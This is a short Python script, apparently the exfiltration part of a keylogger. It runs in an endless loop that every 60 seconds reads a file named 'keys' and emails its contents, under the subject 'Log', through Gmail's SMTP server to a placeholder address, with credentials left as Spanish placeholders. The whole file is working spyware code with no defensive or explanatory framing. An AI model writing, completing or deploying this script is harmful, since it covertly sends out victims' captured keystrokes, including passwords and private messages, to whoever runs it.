import sys
import smtplib
import time
from getpass import getuser
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

user = getuser()

def enviar():
    msg = MIMEMultipart("plain")
    password = "CONTRASEÑA_APP_GMAIL"
    msg['From'] = "CORREO_REMITENTE"
    msg['To'] = "CORREO_DESTINATARIO"
    msg['Subject'] = "Log"

    mensaje = MIMEText(open(f"RUTA/keys", "r").read(), "plain")
    msg.attach(mensaje)
    smtp = smtplib.SMTP("smtp.gmail.com: 587")
    smtp.starttls()
    smtp.login(msg['From'], password)

    smtp.sendmail(msg['From'], msg['To'], msg.as_string())
    smtp.quit()

while True:
    enviar()
    time.sleep(60)
